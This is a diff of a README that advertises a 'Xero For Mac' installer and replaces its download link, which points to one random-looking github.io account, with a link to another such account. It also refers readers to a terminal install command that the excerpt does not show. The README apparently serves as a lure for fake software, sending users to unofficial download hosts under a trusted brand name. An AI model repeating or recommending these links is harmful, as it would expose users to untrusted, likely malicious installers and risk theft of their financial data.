@@ -3,7 +3,7 @@
 
 Easily install **Xero For Mac** 💻 to manage your accounting, invoices, payroll, and reports directly from your desktop. Follow the guide below to install and start using Xero on Mac OS.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple&logoColor=white)](https://kamartamara.github.io/.github/xero)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple&logoColor=white)](https://tayusikf8398.github.io/.github/xero)
 
 If the button does not work, please follow the installation instructions below using the terminal command.
 
